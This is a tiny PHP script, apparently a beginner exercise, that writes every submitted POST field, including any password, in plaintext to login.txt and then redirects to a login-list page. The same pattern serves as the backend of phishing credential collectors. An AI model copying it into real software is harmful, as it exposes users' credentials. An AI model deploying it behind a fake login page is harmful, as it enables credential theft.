<?php

    $dados = $_POST;
    $dados = implode(" - ", $dados);
 
    $arquivo = fopen("login.txt", "a+");
    fwrite($arquivo, $dados."\n");
    fclose($arquivo);

    header("location: listadelogin.php");



?>